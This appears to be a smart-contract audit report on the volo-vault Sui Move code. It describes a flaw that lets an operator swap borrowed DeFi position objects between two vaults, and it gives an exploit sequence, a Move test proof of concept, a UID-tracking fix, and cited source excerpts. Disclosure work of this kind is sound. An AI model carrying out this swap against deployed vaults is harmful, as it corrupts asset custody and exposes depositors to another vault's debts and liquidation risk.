# Audit Report

## Title
Cross-Vault Asset Contamination via Insufficient Asset Identity Verification

## Summary
The vault operation system tracks borrowed DeFi assets using string-based keys (e.g., "NaviAccountCap0") but fails to verify that the returned asset object is the same instance that was borrowed. An operator with legitimate `OperatorCap` can exploit this by swapping DeFi asset objects between two vaults during concurrent operations, permanently corrupting the custody mapping of both vaults.

## Finding Description

The vault operation flow has three critical functions that work together to borrow and return DeFi assets:

**Borrowing Phase:** When `start_op_with_bag()` borrows assets from a vault, it removes them by string key and places them in a `Bag` object that is returned to the operator. [1](#0-0) 

**Return Phase:** When `end_op_with_bag()` returns assets, it removes them from the operator's `Bag` using the same string keys and calls `return_defi_asset()` to add them back to the vault. [2](#0-1) 

The `return_defi_asset()` function accepts any asset object of the correct type and blindly adds it to the vault's bag without verifying its identity: [3](#0-2) 

**Validation Phase:** The `end_op_value_update_with_bag()` function validates that assets were returned by checking only key existence via `contains_asset_type()`: [4](#0-3) 

The `contains_asset_type()` function only checks if a key exists in the bag, not whether the correct asset instance is present: [5](#0-4) 

**Exploit Scenario:**

An operator can execute the following in a single Sui Programmable Transaction Block:

1. Call `start_op_with_bag()` on VaultA → receives `defi_assets_A` containing AssetA at key "NaviAccountCap0"
2. Call `start_op_with_bag()` on VaultB → receives `defi_assets_B` containing AssetB at key "NaviAccountCap0"  
3. Use `Bag::remove()` and `Bag::add()` to swap: put AssetB into `defi_assets_A` and AssetA into `defi_assets_B`
4. Call `end_op_with_bag()` on VaultA with swapped `defi_assets_A` → returns AssetB to VaultA
5. Call `end_op_with_bag()` on VaultB with swapped `defi_assets_B` → returns AssetA to VaultB
6. Call `end_op_value_update_with_bag()` on both vaults → both pass validation because keys exist

The vault_id checks pass because each vault is called with its correct `TxBag` structure, which tracks only the vault_id and key names, not asset object identities. [6](#0-5) 

This breaks the fundamental custody invariant: "All borrowed DeFi assets returned; asset IDs/types match." The assets are of correct types but wrong instances.

## Impact Explanation

**CRITICAL Severity** - This violates the core custody guarantee of the vault system:

1. **Permanent Custody Corruption**: VaultA now controls VaultB's Navi lending position (with its specific collateral/debt), Cetus LP position (with its liquidity range), or Suilend obligation (with its borrowing state). These positions cannot be undone.

2. **Risk Profile Misalignment**: Users who deposited into VaultA expecting its risk parameters now have their funds managed using VaultB's DeFi positions, which may have entirely different collateralization ratios, debt levels, or liquidation risks.

3. **Accounting Fraud**: Each vault calculates `total_usd_value` and share prices based on assets it claims to own but doesn't actually control. This creates phantom value or hidden liabilities.

4. **Cross-Contamination**: If VaultB's Navi position has high debt and faces liquidation, VaultA users unknowingly inherit that liquidation risk despite having no relationship with VaultB.

5. **Undetectable**: The validation mechanism has no way to detect this corruption since it only verifies key existence. Event emissions and on-chain data would show normal operation.

All users of both contaminated vaults are affected - they lose the fundamental guarantee that their proportional share of vault assets corresponds to the actual DeFi positions the vault controls.

## Likelihood Explanation

**HIGH Likelihood** - This requires only:

- **Attacker Profile**: Legitimate operator with `OperatorCap` (not a compromised role)
- **Privilege Scope Issue**: The operator's privileges are too broad - they receive mutable `Bag` objects they can manipulate
- **Complexity**: LOW - The attack uses only standard Sui `Bag` operations and public vault functions in a straightforward sequence
- **Preconditions**: Two vaults exist with DeFi assets of the same type (common in production)
- **Execution**: Can be performed atomically in a single Sui PTB (Programmable Transaction Block)
- **Detection**: NONE - The validation logic has no mechanism to detect wrong asset instances

This is a **mis-scoped privilege vulnerability** rather than a malicious operator assumption. The protocol grants operators the technical capability to perform this swap, even if unintentionally, due to insufficient validation.

## Recommendation

Implement asset identity tracking by storing the UID of borrowed assets and verifying it on return:

```move
// In Vault struct, add:
borrowed_asset_uids: Table<String, address>,

// In borrow_defi_asset():
public(package) fun borrow_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
): AssetType {
    // ... existing code ...
    let asset = self.assets.remove<String, AssetType>(asset_type);
    
    // NEW: Store the UID of the borrowed asset
    let asset_uid = object::id_address(&asset);
    if (self.status() == VAULT_DURING_OPERATION_STATUS) {
        self.borrowed_asset_uids.add(asset_type, asset_uid);
    }
    
    asset
}

// In return_defi_asset():
public(package) fun return_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    asset: AssetType,
) {
    self.check_version();
    
    // NEW: Verify the returned asset UID matches what was borrowed
    if (self.borrowed_asset_uids.contains(asset_type)) {
        let expected_uid = self.borrowed_asset_uids.remove(asset_type);
        let actual_uid = object::id_address(&asset);
        assert!(actual_uid == expected_uid, ERR_WRONG_ASSET_INSTANCE);
    }
    
    emit(DefiAssetReturned { /* ... */ });
    self.assets.add<String, AssetType>(asset_type, asset);
}
```

Alternatively, consider redesigning the operation flow to not expose mutable `Bag` objects to operators, or use phantom type parameters to bind assets to specific vault instances at compile time.

## Proof of Concept

```move
#[test]
fun test_cross_vault_asset_contamination() {
    let mut scenario = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Create VaultA and VaultB, each with a NaviAccountCap
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut scenario);
    scenario.next_tx(OWNER);
    let mut vaultA = scenario.take_shared<Vault<SUI_TEST_COIN>>();
    let assetA = lending::create_account(scenario.ctx());
    let assetA_id = object::id_address(&assetA);
    vaultA.add_new_defi_asset(0, assetA);
    test_scenario::return_shared(vaultA);
    
    // Create VaultB with different asset
    init_vault::init_create_vault<USDC_TEST_COIN>(&mut scenario);
    scenario.next_tx(OWNER);
    let mut vaultB = scenario.take_shared<Vault<USDC_TEST_COIN>>();
    let assetB = lending::create_account(scenario.ctx());
    let assetB_id = object::id_address(&assetB);
    vaultB.add_new_defi_asset(0, assetB);
    test_scenario::return_shared(vaultB);
    
    // Attack: Start operations on both vaults
    scenario.next_tx(OWNER);
    let operation = scenario.take_shared<Operation>();
    let cap = scenario.take_from_sender<OperatorCap>();
    let mut vaultA = scenario.take_shared<Vault<SUI_TEST_COIN>>();
    let mut vaultB = scenario.take_shared<Vault<USDC_TEST_COIN>>();
    
    let (mut assets_A, tx_A, _, _, _) = operation::start_op_with_bag<SUI_TEST_COIN, SUI_TEST_COIN, SUI_TEST_COIN>(
        &mut vaultA, &operation, &cap, &clock, vector[0], vector[type_name::get<NaviAccountCap>()], 0, 0, scenario.ctx()
    );
    
    let (mut assets_B, tx_B, _, _, _) = operation::start_op_with_bag<USDC_TEST_COIN, USDC_TEST_COIN, USDC_TEST_COIN>(
        &mut vaultB, &operation, &cap, &clock, vector[0], vector[type_name::get<NaviAccountCap>()], 0, 0, scenario.ctx()
    );
    
    // Swap assets between bags
    let key = vault_utils::parse_key<NaviAccountCap>(0);
    let asset_from_A = assets_A.remove<String, NaviAccountCap>(key);
    let asset_from_B = assets_B.remove<String, NaviAccountCap>(key);
    assets_A.add(key, asset_from_B); // Put B's asset in A's bag
    assets_B.add(key, asset_from_A); // Put A's asset in B's bag
    
    // Return swapped assets - should fail but doesn't
    operation::end_op_with_bag(&mut vaultA, &operation, &cap, assets_A, tx_A, balance::zero(), balance::zero());
    operation::end_op_with_bag(&mut vaultB, &operation, &cap, assets_B, tx_B, balance::zero(), balance::zero());
    
    // Verify contamination: VaultA now has assetB instead of assetA
    let returned_asset_in_A = vaultA.get_defi_asset<SUI_TEST_COIN, NaviAccountCap>(key);
    assert!(object::id_address(returned_asset_in_A) == assetB_id); // CONTAMINATED!
    assert!(object::id_address(returned_asset_in_A) != assetA_id); // Wrong asset!
}
```

### Citations

**File:** volo-vault/sources/operation.move (L80-92)
```text
public struct TxBag {
    vault_id: address,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
}

public struct TxBagForCheckValueUpdate {
    vault_id: address,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    total_usd_value: u256,
    total_shares: u256,
}
```

**File:** volo-vault/sources/operation.move (L94-206)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);

    let mut defi_assets = bag::new(ctx);

    let defi_assets_length = defi_asset_ids.length();
    assert!(defi_assets_length == defi_asset_types.length(), ERR_ASSETS_LENGTH_MISMATCH);

    let mut i = 0;
    while (i < defi_assets_length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(
                vault_utils::parse_key<NaviAccountCap>(defi_asset_id),
            );
            defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = vault.borrow_defi_asset<T, CetusPosition>(cetus_asset_type);
            defi_assets.add<String, CetusPosition>(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let obligation_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = vault.borrow_defi_asset<T, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
            );
            defi_assets.add<String, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
                obligation,
            );
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = vault.borrow_defi_asset<T, MomentumPosition>(
                momentum_asset_type,
            );
            defi_assets.add<String, MomentumPosition>(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = vault.borrow_defi_asset<T, Receipt>(receipt_asset_type);
            defi_assets.add<String, Receipt>(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    let principal_balance = if (principal_amount > 0) {
        vault.borrow_free_principal(principal_amount)
    } else {
        balance::zero<T>()
    };

    let coin_type_asset_balance = if (coin_type_asset_amount > 0) {
        vault.borrow_coin_type_asset<T, CoinType>(
            coin_type_asset_amount,
        )
    } else {
        balance::zero<CoinType>()
    };

    let total_usd_value = vault.get_total_usd_value(clock);
    let total_shares = vault.total_shares();

    let tx = TxBag {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
    };

    let tx_for_check_value_update = TxBagForCheckValueUpdate {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        total_usd_value,
        total_shares,
    };

    emit(OperationStarted {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount,
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount,
        total_usd_value,
    });

    (defi_assets, tx, tx_for_check_value_update, principal_balance, coin_type_asset_balance)
```

**File:** volo-vault/sources/operation.move (L209-297)
```text
public fun end_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    mut defi_assets: Bag,
    tx: TxBag,
    principal_balance: Balance<T>,
    coin_type_asset_balance: Balance<CoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
    vault.assert_during_operation();

    let TxBag {
        vault_id,
        defi_asset_ids,
        defi_asset_types,
    } = tx;

    assert!(vault.vault_id() == vault_id, ERR_VAULT_ID_MISMATCH);

    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = defi_assets.remove<String, NaviAccountCap>(navi_asset_type);
            vault.return_defi_asset(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = defi_assets.remove<String, CetusPosition>(cetus_asset_type);
            vault.return_defi_asset(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = defi_assets.remove<String, SuilendObligationOwnerCap<ObligationType>>(
                suilend_asset_type,
            );
            vault.return_defi_asset(suilend_asset_type, obligation);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = defi_assets.remove<String, MomentumPosition>(
                momentum_asset_type,
            );
            vault.return_defi_asset(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = defi_assets.remove<String, Receipt>(receipt_asset_type);
            vault.return_defi_asset(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    emit(OperationEnded {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount: principal_balance.value(),
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount: coin_type_asset_balance.value(),
    });

    vault.return_free_principal(principal_balance);

    if (coin_type_asset_balance.value() > 0) {
        vault.return_coin_type_asset<T, CoinType>(coin_type_asset_balance);
    } else {
        coin_type_asset_balance.destroy_zero();
    };

    vault.enable_op_value_update();

    defi_assets.destroy_empty();
}
```

**File:** volo-vault/sources/operation.move (L326-350)
```text
        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            assert!(vault.contains_asset_type(navi_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(cetus_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            assert!(vault.contains_asset_type(suilend_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(momentum_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        i = i + 1;
```

**File:** volo-vault/sources/volo_vault.move (L1346-1351)
```text
public(package) fun contains_asset_type<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): bool {
    self.assets.contains(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1436-1449)
```text
public(package) fun return_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    asset: AssetType,
) {
    self.check_version();

    emit(DefiAssetReturned {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.add<String, AssetType>(asset_type, asset);
}
```
